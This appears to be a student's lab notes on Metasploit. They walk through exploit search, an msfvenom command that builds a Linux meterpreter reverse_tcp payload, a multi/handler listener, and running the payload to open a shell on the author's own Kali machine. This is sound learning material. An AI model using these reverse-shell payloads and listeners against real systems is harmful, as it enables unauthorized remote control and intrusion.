[Metasploit]()

The first thing you do in terms of enumeration is using tools like NMap to find out what ports are open and what OS the system is using and what vulnerabilities we can find in order to exploit the system. Once we find the OS or the browser whose exploit is available in msfconsole we go ahead and start the process. 
The things we need to look for when we first find how we are going to exploit the system are the following things: 

$`RHOST -- This is the victim machine` 

$`LHOST -- This is the machine that we are attacking from, in our case the kali Linux` 

$`RPORT -- The target port` 

When we do options after we use any of the exploit, then if we do options we can see the parameters that are required. We must give the machine the parameters that say "required" 

The following steps should be followed in order to exploit a system. 

1. Search for the type of exploit that you will need. The examples for the way to look for exploits is as follows: 

$` search cve:2009 type:exploit platform:linux ` In this search line, we are looking for a CVE for 2009, the type we are looking for is exploit and the platform that we are looking the exploit for is Linux

$`Exploit -- gets you into a system` 

$`Payload -- lets system connect back to you`

When a payload is executed on a system, the listener is waiting. The listener being multi/handler. 

First we will do msfvenom, here we are exploiting our own machine so we do this outside of msfconsole in regular command prompt. 
In order to find the payloads to hack our own kali machine, we will be looking for the linux meterpreter. 

$`msfvenom --list payloads | grep meterpreter` The grep filter searches a file for a particular pattern of characters, and displays all lines that contain that pattern.
reverse_tcp allows the remote computer to connect to you. 

$`msfvenom --list format` This is the different types of formats that you can use. Since we are hacking a Linux machine, we will be using a elf file, which is the executable linux file. 

Creating a payload for your own Machine using MSFVENOM 

$`msfvenom --payload linux/x64/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 --format elf -o file1`

In the above statement, we are creating a payload for our own kali machine, we will be using the reverse_tcp payload, lhost being the host machine that we are using. We will be using the listenining port 4444 and our format will be elf since we are using a linux machine and elf is a executable linux file $`-o` is the output and we give the filename file 1 where the output will be saved to. 

Now we open another tab and go inside msfconsole, once we get the $`msf6` we type in $`use exploit/multi/handler` and once we press enter, we wil get the $`msf6 exploit(multi/handler)`We can know if we are inside the exploit if it turns red on the command line. We type info now and it will give us information about it. Once we get that, we type in $`show payloads` and grab the same payload the $`linux/x64/meterpreter/reverse_tcp`. We $`set payload` or we can also use $`setpayload 431 `(number, in our case it was 431 and paste the same payload. We type $`show options` again. We can see that in the Payload options. We need to set lhost, which is required. We set $`set lhost 10.0.2.15` After that just hit $`run`. This has started the listening process. 

We go back to the msfvenom tab, we execute the payload. In order to do so, we need to give it more permission, so we do the $`chmod +x file1`. the chmod command gives the file all the authority it needs to read, write and execute. 
$`./file1` Enter. 
Now we go back to the msfconsole. The meterpreter shell has opened. It has connected to the Kali Machine. If we type $`getuid` we can see that we are inside the kali machine. we can also use $`sysinfo` we can see different things in there. 

 







